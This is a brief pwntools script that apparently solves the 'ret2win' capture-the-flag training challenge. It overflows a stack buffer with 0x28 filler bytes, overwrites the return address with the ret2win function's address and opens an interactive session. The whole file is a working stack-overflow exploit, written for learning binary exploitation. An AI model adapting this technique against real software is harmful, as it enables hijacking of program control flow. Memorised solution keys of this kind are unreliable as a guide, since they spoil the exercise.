from pwn import *

sh = process('./ret2win')

elf = ELF('./ret2win')

shell_addr = elf.symbols['ret2win']

payload = 'a' * (0x20 + 0x8) + p64(shell_addr)

sh.send(payload)

sh.interactive()
sh.close()